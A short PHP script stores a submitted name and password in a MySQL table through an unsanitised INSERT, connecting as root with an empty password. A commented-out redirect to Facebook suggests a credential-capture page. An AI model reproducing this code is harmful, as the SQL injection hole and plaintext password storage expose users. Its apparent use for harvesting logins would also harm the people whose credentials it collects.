<?php

$servidor = "localhost";
$usuario = "root";
$clave = "";
$basededato = "login";

$enlace = mysqli_connect ($servidor , $usuario , $clave , $basededato);


if(isset ($_POST['registro'])){

    $nombre= $_POST ['nombre'];
    $contrasena= $_POST ['clave'];

    $insertadatos = "INSERT INTO getfiles VALUES('$nombre','$contrasena','')";

    $ejecutarInserta = mysqli_query ($enlace , $insertadatos);

//   header('Location:https://www.facebook.com/watch/?ref=saved&v=491888249768323');
    // exit();

 

}
?>
   <!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
</head>

<body>
    <form action="index.html" method="post" class="form">

    </body>

    </html>

